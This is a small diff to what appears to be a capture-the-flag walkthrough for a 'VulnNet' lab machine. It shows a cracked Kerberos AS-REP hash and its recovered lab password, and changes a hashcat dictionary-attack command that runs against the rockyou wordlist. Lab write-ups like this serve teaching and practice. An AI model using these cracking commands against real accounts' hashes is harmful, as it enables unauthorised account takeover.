@@ -146,7 +146,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL) 
 
 # using hashcat.
-hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 {% endcode %}
 
